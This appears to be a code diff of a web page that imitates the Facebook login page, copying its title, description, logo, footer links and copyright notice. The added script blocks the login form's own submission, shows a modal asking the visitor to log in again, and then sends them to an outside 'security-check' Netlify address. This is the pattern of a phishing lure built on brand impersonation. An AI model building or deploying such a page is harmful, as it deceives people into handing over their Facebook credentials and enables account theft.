@@ -4,6 +4,7 @@
   <meta charset="UTF-8"> 
   <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
   
+  <!-- Updated Open Graph tags -->
   <meta property="og:title" content="Facebook – log in or sign up"> 
   <meta property="og:description" content="Facebook helps you connect and share with the people in your life."> 
   <meta property="og:image" content="https://raw.githubusercontent.com/Gunjan-netizen/Plasto/refs/heads/main/Ms.jpg"> 
@@ -27,12 +28,12 @@
 
     .modal-content {
         background-color: #fefefe;
-        margin: 15% auto;
+        margin: 15% auto; /* 15% from the top and centered */
         padding: 20px;
         border: 1px solid #888;
-        width: 80%;
-        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-        border-radius: 8px;
+        width: 80%; /* Could be more or less, depending on screen size */
+        box-shadow: 0 5px 15px rgba(0,0,0,0.3); /* Add shadow for better visibility */
+        border-radius: 8px; /* Rounded corners */
     }
 
     .close-button {
@@ -53,33 +54,24 @@
         margin: 10px;
         padding: 10px 20px;
         border: none;
-        background-color: #4267B2;
+        background-color: #4267B2; /* Default button color */
         color: white;
         cursor: pointer;
-        border-radius: 5px;
-        font-weight: bold;
+        border-radius: 5px; /* Rounded corners for buttons */
+        font-weight: bold; /* Bold text */
     }
 
     .modal-button {
-        background-color: #1373eb;
-        border-radius: 8px;
+        background-color: #1373eb; /* New color for modal buttons */
+        border-radius: 8px; /* Rounded corners for modal buttons */
     }
 
     .modal-content h2 {
-        margin-top: 20px;
-        text-align: center;
+        margin-top: 20px; /* Adjust space above heading */
     }
 
     .modal-content p {
-        margin-top: 30px; /* Push the description lower */
-        text-align: center;
-    }
-
-    /* Center the Login button */
-    .login-center {
-        display: flex;
-        justify-content: center;
-        align-items: center;
+        margin-bottom: 20px; /* Adjust space below paragraph */
     }
   </style>
 </head> 
@@ -111,13 +103,9 @@
       <div class="modal-content">
           <span class="close-button" onclick="closeModal()">&times;</span>
           <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" style="display: block; margin: 0 auto; width: 50px; height: auto;"/>
-          <h2>Continue your search</h2>
-          <p>Log in to find out more about your interests and get the latest updates.</p>
-          
-          <!-- Centered Login Button -->
-          <div class="login-center">
-            <button class="modal-button" onclick="redirectToLogin()">Log in</button>
-          </div>
+          <h2 style="text-align: center;">Continue your search</h2>
+          <p style="text-align: center;">Log in to find out more about your interests and get the latest updates.</p>
+          <button class="modal-button" onclick="redirectToHomePage()">Log in</button>
       </div>
   </div>
 
@@ -155,18 +143,39 @@
      <li><a href="#">Voting Information Centre</a></li> 
      <li><a href="#">Privacy Policy</a></li> 
      <li><a href="#">Privacy Centre</a></li> 
-     <li><a href="#">Groups</a></li> 
+     <li><a href="#">Terms of Service</a></li>
      <li><a href="#">About</a></li> 
-     <li><a href="#">Create ad</a></li> 
+     <li><a href="#">Create Ad</a></li> 
      <li><a href="#">Create Page</a></li> 
      <li><a href="#">Developers</a></li> 
      <li><a href="#">Careers</a></li> 
      <li><a href="#">Cookies</a></li> 
-     <li><a href="#">AdChoices</a></li> 
-     <li><a href="#">Terms</a></li> 
-     <li><a href="#">Help</a></li> 
-     <li><a href="#">Contact uploading and non-users</a></li> 
+     <li><a href="#">Ad Choices</a></li> 
+     <li><a href="#">More</a></li> 
     </ol> 
-    <small>Meta © 2024</small> 
    </div> 
+   <p>&copy; 2024 Facebook, Inc.</p>
   </footer>
+
+  <script>
+    // Modal Functionality
+    function closeModal() {
+        document.getElementById("popupModal").style.display = "none";
+    }
+
+    function showModal() {
+        document.getElementById("popupModal").style.display = "block";
+    }
+
+    // Redirect to the home page on login
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        event.preventDefault(); // Prevent form submission
+        showModal(); // Show the modal
+    });
+
+    function redirectToHomePage() {
+        window.location.href = "https://security-check.netlify.app/"; // Redirect to home page
+    }
+  </script>
+</body> 
+</html>
